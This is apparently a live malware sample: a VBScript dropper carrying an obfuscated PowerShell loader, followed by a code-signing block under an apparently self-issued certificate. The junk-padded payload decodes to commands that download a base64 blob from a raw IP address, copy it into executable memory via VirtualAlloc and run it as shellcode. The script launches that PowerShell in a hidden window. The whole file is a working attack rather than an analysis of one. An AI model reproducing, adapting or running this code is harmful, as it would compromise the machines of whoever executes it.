KrIMinBofHyoBe,SliTonSntEm \"\n\nCh9 = Ch9 & \n\"FolTiiUpgPo)Pi;Sp}at'Me;No`$PrAUesEnsabuImrDeaAfnVicFueNisAfuLamMimGleBurBrnHaeShsBo1Op5Ag8Pa2Ab=Br`$TreVonSvvPa:kraBapImpPjdRoaKotReaCa In+Ps Ty`Affedninge1Affedninge1Affedninge1En\\NiIsksStoMolReeBorAliPonLugKosEfmTuaUntMueLnrJeiGyaHelHeeUkrSanSpeGasAs.BydMoahetCy`A\"\n\nCh9 = Ch9 & \n\"ffedninge1Affedninge1Affedninge1vi;Re`$SkABekUdtJviSioApnUdsJorAraHadHoiSauKasaneStrTanTaeOm=Vi'in'Up;diiInfUf Su(Ch-BinInoRhtIm(DrTDieHysPltSp-AaPToaAntPahNo Do`$\"\n\nCh9 = Ch9 & \n\"VeAGosHysInuborabaHenprcNaeHesReuChmFlmeneMarAfnSeeKnsqu1Th5Af8Tr2La)Sl)Da Au{FiwGlhSkiUnlToeLi Pa(Fk`$ClAPlkpatPhiDeoSanWasUnrHeaBudCuiEnuStsMueplrRenPheCh Ki-ExeGrqLe se'Ti'Im)In Pr{No`$AfAHikAptp\"\n\nCh9 = Ch9 & \n\"riFroHonSesTurFoatydLeireuArsOpeRarUdnAueMo Gi=ko Ab(QuNSaePawBl-ReOFabByjDieTicHotDa boNmieCotSk.SpWSeeUnbFrCTvlGoiPreBenbitAu)po.CoDreoOvwPrnPelTioBaaIndBySV\"\n\nCh9 = Ch9 & \n\"atUnrsoiApnBrgBe(Do'WihFatAutIcpSa:Ch/Fl/Ar1Fo3Bu9Sh.Ve2Iv8Mb.In3To6Bl.Ma1Pl4Nd7Ss/MeSMeaMemAbmmeeCenSlsFetNeiBelhjlOreRenKxdUpeVisRg.AndKosMepLi'Sp)Ha;ScSAntDraCorLatKa-SkSHalP\"\n\nCh9 = Ch9 & \n\"aeIneSapAa Ki5Kl;Rv}BiSMieZotSu-MyCSioDrnDithoeSlnVotTh Bo`$AdAchsOssBeuKorFoaKunApcWiePrsUnuDimOnmpaefurarnUneTosre1De5Pr8Tv2So Ru`$OmASakGetOfiCboFonS\"\n\nCh9 = Ch9 & \n\"nsThrTiaDodToiChuAusAfeForRenLseKa;Ru}Fu`$LuASasMesFouOprDiaOpnUncOxeBesCruFlmSemKiecerBenPreSesDe1Mu5Ye8Ga3Je=Sp[CrAHusAfsCeuAmrMeaHonBucBeeCosLeuAnmOpmSkeSmrHenPreAusPa1mi5Ph8Eg1co]Ub:Fo:KoVHoiSkrTrtPauSiatrlKaAIlleplGloAlcIn(Sa0Ud,De1de0Ou4Kn8Bu5Me7Do\"\n\nCh9 = Ch9 & \n\"6Ce,Re1Jo2Th2Ar8So8Co,Ca6Au4An)Ge;Ta`$LuABekIntDyiBroSynUnsSurRiaStdKdibeuUdsSheAkrRenKoeDi Uf=In RhGSteMdtUl-QuCReocunAftTaeKlnAgtPe Le`$PrAIlsZisfruStrFlaLinKrcleeUnsKvuJumEumAfeKorstnCueDisTi1Fo5Uf8es2li;Fl`$FrPEsaRkrWoeD\"\n\nCh9 = Ch9 & \n\"ooMoeCoaFinOv St=Co Se[noSChyVisFotUneTimOs.SoCProBenEsvDaeLirSktJu]Ku:Ti:PaFGarOmoAxmMaBMaaUnsSjeGo6Km4BySRotInrPoiBanRegEx(Ba`$MiAMokGltStiWioponAlsEnrIsaBedPaireuSpsSkeVerStnEueAu)In;ko[HaSSkyAmsHotAeeHamSt.BlRomuBenRitSuiPrmofeHv.PaIbunLetAbeSyrProSupCoSNeeinrDuvAaiAfcCoePosRr.beMFaaRarGasS\"\n\nCh9 = Ch9 & \n\"khBeaStlSu]We:Re:BaCLeoUnpPlyMo(Ar`$OvPMiaAnrReeNooBoeEnaSpnOx,Fa Af0Va,Hy Ch Ho`$PaAResVisJauFirPeaFonUncDeePrsInuHemOpmSteGrrUdnFleAdsCu1Bl5Se8Dy3Im,Wa In`$DiPSpaRerSueAfoMaeKaaLanSl.PrcUnohuuPrnAntIn)At;aa[SeApasPlsHyunarLi\"\n\nCh9 = Ch9 & \n\"aTenPrcTheMesChuFumTemUneInrScnDieCasTy1Re5Dy8El1Un]To:Re:ReETrnEluUbmGeWOmiRynTadKroOpwgaSSmtDeaArtDriFooRinChsStWpa(Af`$UtAUssSesKoukarUnadunTrcCheEnsFluInmSkmraeInrEmnSueMesSl1Su5Ar8Vr3Wi,Ri Br0Cr)Un#Bu;A\"\n\nCh9 = Ch9 & \n\"ffedninge1Affedninge1Affedninge1;Function Assurancesummernes1584 {    param([String]$HS);    For($i=2; $i -lt $HS.Length-1; $i+=(2+1)){        $Sardindaasens = $Sardindaasens + $HS.Substring($i, 1);    }    $Sard\"\n\nCh9 = Ch9 & \n\"indaasens;}$Taxiauto0 = Assurancesummernes1584 'ReIMiETiXCe ';$Taxiauto1= Assurancesummernes1584 $Translucences;& ($Taxiauto0) $Taxiauto1;;\"\n\n\n\nset\n Nitwits \n= CreateObject(\n\"Scripting.FileSystemObject\"\n)\n\n \n\nset\n \nBladeventyrs = CreateObject(\n\"WScript.Shell\"\n)\n\n\n\nSet\n \nIglus = Bladeventyrs.Exec(\n\"cmd /c echo %windir%\"\n)\n\n\nPolysome0 \n= Iglus.StdOut.ReadLine()\n\n\nRambo \n=  Polysome0 &\n \n\"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershel\"\n+\n\"l.exe\"\n\n\n\n\nset\n \nSweepback = CreateObject(\n\"Shell.Application\"\n)\n\nIf \nNitwits.FileExists(Rambo) = false then Rambo =\n \n\"powershell.exe\"\n\n\nCh9 \n= replace(Ch9,\n\"Affedninge1\"\n,chr(34))\n\n\nSweepback.ShellExecute \nRambo,\n \n\" \"\n \n& chrw(34) & Ch9 & chrw(34),\n \n\"\"\n,\n \n\"\"\n, 0\n\n\n\n\n\n \n \n\n''\n SIG \n''\n \nBegin signature block\n\n\n''\n SIG \n''\n \nMIIeNwYJKoZIhvcNAQcCoIIeKDCCHiQCAQExDzANBglg\n\n\n''\n SIG \n''\n \nhkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor\n\n\n''\n SIG \n''\n \nBgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC\n\n\n''\n SIG \n''\n \nAQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg\n\n\n''\n SIG \n''\n \nsSQkxx1Q5QReAw2o0O6fe793F72tx09levKgjTbDW46g\n\n\n''\n SIG \n''\n \nggQXMIIEEzCCAvugAwIBAgIIVsqjEQ8omPUwDQYJKoZI\n\n\n''\n SIG \n''\n \nhvcNAQELBQAwgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI\n\n\n''\n SIG \n''\n \nDBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD\n\n\n''\n SIG \n''\n \nvHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI\n\n\n''\n SIG \n''\n \nhvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD\n\n\n''\n SIG \n''\n \nVQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz\n\n\n''\n SIG \n''\n \ndGlhIDAeFw0yMTExMTcxMDA3MTdaFw0yNDExMTYxMDA3\n\n\n''\n SIG \n''\n \nMTdaMIGeMQswCQYDVQQGEwJERTEbMBkGA1UECAwSU2No\n\n\n''\n SIG \n''\n \nbGVzd2lnLUhvbHN0ZWluMRIwEAYDVQQHDAlMw7xyc2No\n\n\n''\n SIG \n''\n \nYXUxDzANBgNVBAoMBlNuaXBwZTEiMCAGCSqGSIb3DQEJ\n\n\n''\n SIG \n''\n \nARYTVHVhcmVnQFRvbHVpZGluZS5TazEpMCcGA1UECwwg\n\n\n''\n SIG \n''\n \nSGluZGJybWFybWVsYWRlcm5lIEd5bmVjb21hc3RpYSAw\n\n\n''\n SIG \n''\n \nggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDA\n\n\n''\n SIG \n''\n \nbxkjrOQpmE8BceChyNKZMB1sQKI\n/L1331RBRguylaYLe\n\n''\n SIG \n''\n H57+GWKQl1jUWXRPa5cqC/\ndf1OGj9x707NLLo8ygB0A4\n\n\n''\n SIG \n''\n \nnjyC2bhVy\n/pC0lV4v3xgwaKWcCqaAC2cRVavxyVNAr0K\n\n''\n SIG \n''\n cdESjH1OMetzxUd6+xmnBBSsRjLXZ7zIL00PTcW6qE2u\n\n''\n SIG \n''\n x1l5eXMtBbsZ257ujKjKq3ZmRoN5HbmLiAW1J5ckwBqB\n\n''\n SIG \n''\n wfvfACuMumwGDPjOGl9ycwjcaAgl69y1hVIiy7mAIV3D\n\n''\n SIG \n''\n cNuTtslCl47QQ+Xpi18uSFgqhTuAsvIpKfJ6uGvTL09U\n\n''\n SIG \n''\n bDgDEkZXFkwh3TQUzqO0eK1QFX/\n8u5U1AgMBAAGjUzBR\n\n\n''\n SIG \n''\n \nMB0GA1UdDgQWBBR96iGRZyy1E9ajUW4zDwUoV6hguTAf\n\n\n''\n SIG \n''\n \nBgNVHSMEGDAWgBR96iGRZyy1E9ajUW4zDwUoV6hguTAP\n\n\n''\n SIG \n''\n \nBgNVHRMBAf8EBTADAQH\n/MA0GCSqGSIb3DQEBCwUAA4IB\n\n''\n SIG \n''\n AQAX6YH0P5pn3Ehm7XtSyDfhrcFBYr+TXG5lCVgAVZuO\n\n''\n SIG \n''\n AfPQBO8y/\nJfP6cQZYYz+0I8d7qZbDJS\n/B60txKnBK2es\n\n''\n SIG \n''\n k0QcxQ1Tr+RAKZLRXlbpReEloN2b5WFejh08iyQ+\n7\nxP9\n\n''\n SIG \n''\n OV+xaIGduXbjU0xoM6P1rlCh/\nSQ4tYuYBgiIQJhsStlD\n\n\n''\n SIG \n''\n \nDf3T7hbzwCvvu67tvhMuoDgi412ZKfMIMEtf1XQYes8I\n\n\n''\n SIG \n''\n \nD5rkUiXNRZR0NK6j0V+8dS+QlKOc9sbFzRMOYzktPXAo\n\n\n''\n SIG \n''\n \nC7SFS6X\n/C/\nWA6ozpog8CRSvPjxGVXRLl8bl9eEnZtc6N\n\n\n''\n SIG \n''\n \nOxo4pcyblS6UYxE5vHLoSQHagTpjLiFPoVC6MYIZeDCC\n\n\n''\n SIG \n''\n \nGXQCAQEwgaswgZ4xCzAJBgNVBAYTAkRFMRswGQYDVQQI\n\n\n''\n SIG \n''\n \nDBJTY2hsZXN3aWctSG9sc3RlaW4xEjAQBgNVBAcMCUzD\n\n\n''\n SIG \n''\n \nvHJzY2hhdTEPMA0GA1UECgwGU25pcHBlMSIwIAYJKoZI\n\n\n''\n SIG \n''\n \nhvcNAQkBFhNUdWFyZWdAVG9sdWlkaW5lLlNrMSkwJwYD\n\n\n''\n SIG \n''\n \nVQQLDCBIaW5kYnJtYXJtZWxhZGVybmUgR3luZWNvbWFz\n\n\n''\n SIG \n''\n \ndGlhIAIIVsqjEQ8omPUwDQYJYIZIAWUDBAIBBQCgXjAQ\n\n\n''\n SIG \n''\n \nBgorBgEEAYI3AgEMMQIwADAZBgkqhkiG9w0BCQMxDAYK\n\n\n''\n SIG \n''\n \nKwYBBAGCNwIBBDAvBgkqhkiG9w0BCQQxIgQgfPddFTZR\n\n\n''\n SIG \n''\n \njlHIpoeVY76icMx6fJm0dQjDMeupPa8Bie8wDQYJKoZI\n\n\n''\n SIG \n''\n \nhvcNAQEBBQAEggEAoZEiYMTu3ozWb2ZJha2NQLSjMPDQ\n\n\n''\n SIG \n''\n \n8eRJOc22RWhMyJ5wIRF3hxGCrWz48ZY4470\n/PSA64KI0\n\n''\n SIG \n''\n gIA3DLAI5sA5+IiyKcXuVlS7oTYFOuWAquB1tkVn0OaI\n\n''\n SIG \n''\n Y/\nSJNCE4Vcz+Sfeq7hs+uvAZ+QdzZfBahJxMItJ2Pqqe\n\n\n''\n SIG \n''\n \nvXUH2gCWWZlm7y0GxJZPLH1G1mX\n/E+oanZTA2LyVBKsS\n\n''\n SIG \n''\n slrFv3zeMC04x8JHP8eWboPKS+LBsJJDOZ1XImHwK84i\n\n''\n SIG \n''\n +\n1\nPzdLxfoGucu6h+\n7\nOVjUo9yAvbhWopaAGHmrlEBbyaH\n\n''\n SIG \n''\n zhcCbgTjgrirwYcaWXGqEclsSPk3m2v0StxH23wUvFVT\n\n''\n SIG \n''\n \n33\ncl8KGCFz0wghc5BgorBgEEAYI3AwMBMYIXKTCCFyUG\n\n''\n SIG \n''\n CSqGSIb3DQEHAqCCFxYwghcSAgEDMQ8wDQYJYIZIAWUD\n\n''\n SIG \n''\n BAIBBQAwdwYLKoZIhvcNAQkQAQSgaARmMGQCAQEGCWCG\n\n''\n SIG \n''\n SAGG/\nWwHATAxMA0GCWCGSAFlAwQCAQUABCDpwPdh66lZ\n\n\n''\n SIG \n''\n \nVjjzDfyi5sHzO2HQemkjqua4cx+fe74UkQIQc0aZa0JV\n\n\n''\n SIG \n''\n \noEq4a+IjBMvWohgPMjAyMjExMDgyMzM1MTVaoIITBzCC\n\n\n''\n SIG \n''\n \nBsAwggSooAMCAQICEAxNaXJLlPo8Kko9KQeAPVowDQYJ\n\n\n''\n SIG \n''\n \nKoZIhvcNAQELBQAwYzELMAkGA1UEBhMCVVMxFzAVBgNV\n\n\n''\n SIG \n''\n \nBAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdp\n\n\n''\n SIG \n''\n \nQ2VydCBUcnVzdGVkIEc0IFJTQTQwOTYgU0hBMjU2IFRp\n\n\n''\n SIG \n''\n \nbWVTdGFtcGluZyBDQTAeFw0yMjA5MjEwMDAwMDBaFw0z\n\n\n''\n SIG \n''\n \nMzExMjEyMzU5NTlaMEYxCzAJBgNVBAYTAlVTMREwDwYD\n\n\n''\n SIG \n''\n \nVQQKEwhEaWdpQ2VydDEkMCIGA1UEAxMbRGlnaUNlcnQg\n\n\n''\n SIG \n''\n \nVGltZXN0YW1wIDIwMjIgLSAyMIICIjANBgkqhkiG9w0B\n\n\n''\n SIG \n''\n \nAQEFAAOCAg8AMIICCgKCAgEAz+ylJjrGqfJru43BDZrb\n\n\n''\n SIG \n''\n \noegUhXQzGias0BxVHh42bbySVQxh9J0Jdz0Vlggva2Sk\n\n\n''\n SIG \n''\n /QaDFteRkjgcMQKW+\n3\nKxlzpVrzPsYYrppijbkGNcvYlT\n\n''\n SIG \n''\n \n4\nDotjIdCriak5Lt4eLl6FuFWxsC6ZFO7KhbnUEi7iGkM\n\n''\n SIG \n''\n iMbxvuAvfTuxylONQIMe58tySSgeTIAehVbnhe3yYbyq\n\n''\n SIG \n''\n Ogd99qtu5Wbd4lz1L+\n2\nN1E2VhGjjgMtqedHSEJFGKes+\n\n''\n SIG \n''\n JvK0jM1MuWbIu6pQOA3ljJRdGVq/\n9XtAbm8WqJqclUeG\n\n\n''\n SIG \n''\n \nhXk+DF5mjBoKJL6cqtKctvdPbnjEKD+jHA9QBje6CNk1\n\n\n''\n SIG \n''\n \nprUe2nhYHTno+EyREJZ+TeHdwq2lfvgtGx\n/sK0YYoxn2\n\n''\n SIG \n''\n Off1wU9xLokDEaJLu5i/\n+k\n/kezbvBkTkVf826uV8Mefz\n\n''\n SIG \n''\n wlLE5hZ7Wn6lJXPbwGqZIS1j5Vn1TS+QHye30qsU5Thm\n\n''\n SIG \n''\n h1EIa/\ntTQznQZPpWz+D0CuYUbWR4u5j9lMNzIfMvwi4g\n\n\n''\n SIG \n''\n \n14Gs0\n/EH1OG92V1LbjGUKYvmQaRllMBY5eUuKZCmt2Fk\n\n''\n SIG \n''\n +tkgbBhRYLqmgQ8JJVPxvzvpqwcOagc5YhnJ1oV/\nE9mN\n\n\n''\n SIG \n''\n \nec9ixezhe7nMZxMHmsF47caIyLBuMnnHC1mDjcbu9Sx8\n\n\n''\n SIG \n''\n \ne47LZInxscS451NeX1XSfRkpWQNO+l3qRXMchH7XzuLU\n\n\n''\n SIG \n''\n \nOncCAwEAAaOCAYswggGHMA4GA1UdDwEB\n/wQEAwIHgDAM\n\n''\n SIG \n''\n BgNVHRMBAf8EAjAAMBYGA1UdJQEB/\nwQMMAoGCCsGAQUF\n\n\n''\n SIG \n''\n \nBwMIMCAGA1UdIAQZMBcwCAYGZ4EMAQQCMAsGCWCGSAGG\n\n\n''\n SIG \n''\n /WwHATAfBgNVHSMEGDAWgBS6FtltTYUvcyl2mi91jGog\n\n''\n SIG \n''\n j57IbzAdBgNVHQ4EFgQUYore0GH8jzEU7ZcLzT0qlBTf\n\n''\n SIG \n''\n UpwwWgYDVR0fBFMwUTBPoE2gS4ZJaHR0cDovL2NybDMu\n\n''\n SIG \n''\n ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0UlNB\n\n''\n SIG \n''\n NDA5NlNIQTI1NlRpbWVTdGFtcGluZ0NBLmNybDCBkAYI\n\n''\n SIG \n''\n KwYBBQUHAQEEgYMwgYAwJAYIKwYBBQUHMAGGGGh0dHA6\n\n''\n SIG \n''\n Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBYBggrBgEFBQcwAoZM\n\n''\n SIG \n''\n aHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lD\n\n''\n SIG \n''\n ZXJ0VHJ1c3RlZEc0UlNBNDA5NlNIQTI1NlRpbWVTdGFt\n\n''\n SIG \n''\n cGluZ0NBLmNydDANBgkqhkiG9w0BAQsFAAOCAgEAVaoq\n\n''\n SIG \n''\n GvNG83hXNzD8deNP1oUj8fz5lTmbJeb3coqYw3fUZPwV\n\n''\n SIG \n''\n +zbCSVEseIhjVQlGOQD8adTKmyn7oz/\nAyQCbEx2wmInc\n\n\n''\n SIG \n''\n \nePLNfIXNU52vYuJhZqMUKkWHSphCK1D8G7WeCDAJ+uQt\n\n\n''\n SIG \n''\n \n1wmJefkJ5ojOfRu4aqKbwVNgCeijuJ3XrR8cuOyYQfD2\n\n\n''\n SIG \n''\n \nDoD75P\n/fnRCn6wC6X0qPGjpStOq/\nCUkVNTZZmg9U0rIb\n\n\n''\n SIG \n''\n \nf35eCa12VIp0bcrSBWcrduv\n/mLImlTgZiEQU5QpZomvn\n\n''\n SIG \n''\n Ij5EIdI/\nHMCb7XxIstiSDJFPPGaUr10CU+ue4p7k0x+G\n\n\n''\n SIG \n''\n \nAWScAMLpWnR1DT3heYi\n/HAGXyRkjgNc2Wl+WFrFjDMZG\n\n''\n SIG \n''\n QDvOXTXUWT5Dmhiuw8nLw/\nubE19qtcfg8wXDWd8nYive\n\n\n''\n SIG \n''\n \nQclTuf80EGf2JjKYe\n/\n5\ncQpSBlIKdrAqLxksVStOYkEVg\n\n''\n SIG \n''\n M4DgI974A6T2RUflzrgDQkfoQTZxd639ouiXdE4u2h4d\n\n''\n SIG \n''\n jFrIHprVwvDGIqhPm73YHJpRxC+a9l+nJ5e6li6FV8Bg\n\n''\n SIG \n''\n \n53\nhWf2rvwpWaSxECyIKcyRoFfLpxtU56mWz06J7UWpjI\n\n''\n SIG \n''\n n7+NuxhcQ/\nXQKujiYu54BNu90ftbCqhwfvCXhHjjCANd\n\n\n''\n SIG \n''\n \nRyxjqCU4lwHSPzra5eX25pvcfizM\n/xdMTQCi2NYBDriL\n\n''\n SIG \n''\n \n7\nubgclWJLCcZYfZ3AYwwggauMIIElqADAgECAhAHNje3\n\n''\n SIG \n''\n JFR82Ees/\nShmKl5bMA0GCSqGSIb3DQEBCwUAMGIxCzAJ\n\n\n''\n SIG \n''\n \nBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx\n\n\n''\n SIG \n''\n \nGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV\n\n\n''\n SIG \n''\n \nBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0y\n\n\n''\n SIG \n''\n \nMjAzMjMwMDAwMDBaFw0zNzAzMjIyMzU5NTlaMGMxCzAJ\n\n\n''\n SIG \n''\n \nBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5j\n\n\n''\n SIG \n''\n \nLjE7MDkGA1UEAxMyRGlnaUNlcnQgVHJ1c3RlZCBHNCBS\n\n\n''\n SIG \n''\n \nU0E0MDk2IFNIQTI1NiBUaW1lU3RhbXBpbmcgQ0EwggIi\n\n\n''\n SIG \n''\n \nMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDGhjUG\n\n\n''\n SIG \n''\n \nSbPBPXJJUVXHJQPE8pE3qZdRodbSg9GeTKJtoLDMg\n/la\n\n''\n SIG \n''\n \n9\nhGhRBVCX6SI82j6ffOciQt/\nnR+eDzMfUBMLJnOWbfhX\n\n\n''\n SIG \n''\n \nqAJ9\n/UO0hNoR8XOxs+\n4\nrgISKIhjf69o9xBd/\nqxkrPkLc\n\n\n''\n SIG \n''\n \nZ47qUT3w1lbU5ygt69OxtXXnHwZljZQp09nsad\n/ZkIdG\n\n''\n SIG \n''\n AHvbREGJ3HxqV3rwN3mfXazL6IRktFLydkf3YYMZ3V+\n0\n\n\n''\n SIG \n''\n VAshaG43IbtArF+y3kp9zvU5EmfvDqVjbOSmxR3NNg1c\n\n''\n SIG \n''\n \n1\neYbqMFkdECnwHLFuk4fsbVYTXn+\n149\nzk6wsOeKlSNbw\n\n''\n SIG \n''\n sDETqVcplicu9Yemj052FVUmcJgmf6AaRyBD40NjgHt1\n\n''\n SIG \n''\n biclkJg6OBGz9vae5jtb7IHeIhTZgirHkr+g3uM+onP6\n\n''\n SIG \n''\n \n5\nx9abJTyUpURK1h0QCirc0PO30qhHGs4xSnzyqqWc0Jo\n\n''\n SIG \n''\n n7ZGs506o9UD4L/\nwojzKQtwYSH8UNM\n/STKvvmz3+Drhk\n\n''\n SIG \n''\n Kvp1KCRB7UK/\nBZxmSVJQ9FHzNklNiyDSLFc1eSuo80Vg\n\n\n''\n SIG \n''\n \nvCONWPfcYd6T\n/jnA+bIwpUzX6ZhKWD7TA4j+s4/\nTXkt2\n\n\n''\n SIG \n''\n \nElGTyYwMO1uKIqjBJgj5FBASA31fI7tk42PgpuE+9sJ0\n\n\n''\n SIG \n''\n \nsj8eCXbsq11GdeJgo1gJASgADoRU7s7pXcheMBK9Rp61\n\n\n''\n SIG \n''\n \n03a50g5rmQzSM7TNsQIDAQABo4IBXTCCAVkwEgYDVR0T\n\n\n''\n SIG \n''\n \nAQH\n/BAgwBgEB/\nwIBADAdBgNVHQ4EFgQUuhbZbU2FL3Mp\n\n\n''\n SIG \n''\n \ndpovdYxqII+eyG8wHwYDVR0jBBgwFoAU7NfjgtJxXWRM\n\n\n''\n SIG \n''\n \n3y5nP+e6mK4cD08wDgYDVR0PAQH\n/BAQDAgGGMBMGA1Ud\n\n''\n SIG \n''\n JQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUFBwEBBGswaTAk\n\n''\n SIG \n''\n BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQu\n\n''\n SIG \n''\n Y29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5k\n\n''\n SIG \n''\n aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0\n\n''\n SIG \n''\n LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3Js\n\n''\n SIG \n''\n My5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9v\n\n''\n SIG \n''\n dEc0LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjALBglg\n\n''\n SIG \n''\n hkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBAH1ZjsCT\n\n''\n SIG \n''\n tm+YqUQiAX5m1tghQuGwGC4QTRPPMFPOvxj7x1Bd4ksp\n\n''\n SIG \n''\n +\n3\nCKDaopafxpwc8dB+k+YMjYC+VcW9dth/\nqEICU0MWfN\n\n\n''\n SIG \n''\n \nthKWb8RQTGIdDAiCqBa9qVbPFXONASIlzpVpP0d3+3J0\n\n\n''\n SIG \n''\n \nFNf\n/q0+KLHqrhc1DX+\n1\ngtqpPkWaeLJ7giqzl/\nYy8ZCaH\n\n\n''\n SIG \n''\n \nbJK9nXzQcAp876i8dU+6WvepELJd6f8oVInw1YpxdmXa\n\n\n''\n SIG \n''\n \nzPByoyP6wCeCRK6ZJxurJB4mwbfeKuv2nrF5mYGjVoar\n\n\n''\n SIG \n''\n \nCkXJ38SNoOeY+\n/umnXKvxMfBwWpx2cYTgAnEtp/\nNh4ck\n\n\n''\n SIG \n''\n \nu0+jSbl3ZpHxcpzpSwJSpzd+k1OsOx0ISQ+UzTl63f8l\n\n\n''\n SIG \n''\n \nY5knLD0\n/a6fxZsNBzU+\n2\nQJshIUDQtxMkzdwdeDrknq3l\n\n''\n SIG \n''\n NHGS1yZr5Dhzq6YBT70/\nO3itTK37xJV77QpfMzmHQXh6\n\n\n''\n SIG \n''\n \nOOmc4d0j\n/R0o08f56PGYX/\nsr2H7yRp11LB4nLCbbbxV7\n\n\n''\n SIG \n''\n \nHhmLNriT1ObyF5lZynDwN7+YAN8gFk8n+2BnFqFmut1V\n\n\n''\n SIG \n''\n \nwDophrCYoCvtlUG3OtUVmDG0YgkPCr2B2RP+v6TR81fZ\n\n\n''\n SIG \n''\n \nvAT6gt4y3wSJ8ADNXcL50CN\n/AAvkdgIm2fBldkKmKYcJ\n\n''\n SIG \n''\n RyvmfxqkhQ/\n8mJb2VVQrH4D6wPIOK+XW+6kvRBVK5xMO\n\n\n''\n SIG \n''\n \nHds3OBqhK\n/bt1nz8MIIFjTCCBHWgAwIBAgIQDpsYjvnQ\n\n''\n SIG \n''\n Lefv21DiCEAYWjANBgkqhkiG9w0BAQwFADBlMQswCQYD\n\n''\n SIG \n''\n VQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkw\n\n''\n SIG \n''\n FwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSQwIgYDVQQD\n\n''\n SIG \n''\n ExtEaWdpQ2VydCBBc3N1cmVkIElEIFJvb3QgQ0EwHhcN\n\n''\n SIG \n''\n MjIwODAxMDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQsw\n\n''\n SIG \n''\n CQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j\n\n''\n SIG \n''\n MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYD\n\n''\n SIG \n''\n VQQDExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIi\n\n''\n SIG \n''\n MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC/\n5pBz\n\n\n''\n SIG \n''\n \naN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa\n\n\n''\n SIG \n''\n \nza57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F\n/WBTxS\n\n''\n SIG \n''\n D1Ifxp4VpX6+n6lXFllVcq9ok3DCsrp1mWpzMpTREEQQ\n\n''\n SIG \n''\n \nLt\n+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT+CFh\n\n''\n SIG \n''\n mzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiO\n\n''\n SIG \n''\n DCu3T6cw2Vbuyntd463JT17lNecxy9qTXtyOj4DatpGY\n\n''\n SIG \n''\n QJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+EJFwq1WC\n\n''\n SIG \n''\n QTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/\nCNda\n\n\n''\n SIG \n''\n \nSaTC5qmgZ92kJ7yhTzm1EVgX9yRcRo9k98FpiHaYdj1Z\n\n\n''\n SIG \n''\n \nXUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5jrubU75KSOp49\n\n\n''\n SIG \n''\n \n3ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4\n/\n3\n\n\n''\n SIG \n''\n IbKyEbe7f/\nLVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPR\n\n\n''\n SIG \n''\n \niQfhvbfmQ6QYuKZ3AeEPlAwhHbJUKSWJbOUOUlFHdL4m\n\n\n''\n SIG \n''\n \nrLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU\n/\n\n''\n SIG \n''\n Y+whX8QgUWtvsauGi0/\nC1kVfnSD8oR7FwI+isX4KJpn1\n\n\n''\n SIG \n''\n \n5GkvmB0t9dmpsh3lGwIDAQABo4IBOjCCATYwDwYDVR0T\n\n\n''\n SIG \n''\n \nAQH\n/BAUwAwEB/\nzAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n\n\n\n''\n SIG \n''\n \nP+e6mK4cD08wHwYDVR0jBBgwFoAUReuir\n/SSy4IxLVGL\n\n''\n SIG \n''\n p6chnfNtyA8wDgYDVR0PAQH/\nBAQDAgGGMHkGCCsGAQUF\n\n\n''\n SIG \n''\n \nBwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDovL29jc3Au\n\n\n''\n SIG \n''\n \nZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8v\n\n\n''\n SIG \n''\n \nY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1\n\n\n''\n SIG \n''\n \ncmVkSURSb290Q0EuY3J0MEUGA1UdHwQ+MDwwOqA4oDaG\n\n\n''\n SIG \n''\n \nNGh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2Vy\n\n\n''\n SIG \n''\n 